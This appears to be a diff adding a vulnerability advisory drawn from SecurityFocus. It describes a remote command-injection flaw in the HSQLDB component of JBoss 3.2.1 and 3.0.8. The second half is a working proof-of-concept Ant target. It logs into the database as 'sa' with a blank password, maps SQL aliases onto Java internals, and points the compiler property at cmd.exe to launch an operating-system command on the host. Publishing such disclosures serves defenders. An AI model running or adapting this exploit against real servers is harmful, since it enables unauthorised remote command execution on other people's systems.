@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/8773/info
+
+A remote command-injection vulnerability has been reported in JBoss. The issue is reportedly exposed via the HSQLDB component, which is a SQL database server that manages JMS connections. Because of a number of flaws, an attacker can pass commands to the HSQLDB component via the port it listens on. Note that the port may vary between versions; by default it is 1701/TCP for JBoss 3.2.1 and 1476/TCP for 3.0.8.
+
+Attackers can exploit this issue to mount a number of attacks, including execution of database commands, denial-of-service attacks, log manipulation, information disclosure, and execution of operating system commands on some supported platforms.
+
+This issue is reported to exist with JBoss 3.2.1/3.0.8 on any Java 1.4.x-enabled platforms. Other versions may also be affected. 
+
+<target name="cmdinject">
+<sql
+classpath="hsqldb.jar"
+driver="org.hsqldb.jdbcDriver"
+url="jdbc:hsqldb:hsql://${host}:${port}"
+userid="sa"
+password=""
+print = "true"
+>
+CREATE ALIAS COMPDEBUG FOR
+"org.apache.xml.utils.synthetic.JavaUtils.setDebug"
+CREATE ALIAS SETPROP FOR "java.lang.System.setProperty";
+CREATE ALIAS COMPILE FOR
+"org.apache.xml.utils.synthetic.JavaUtils.JDKcompile";
+
+CALL COMPDEBUG(true);
+CALL SETPROP('org.apache.xml.utils.synthetic.javac','cmd.exe');
+CALL COMPILE('/c REGEDIT.EXE','');
+</sql>
+</target> 
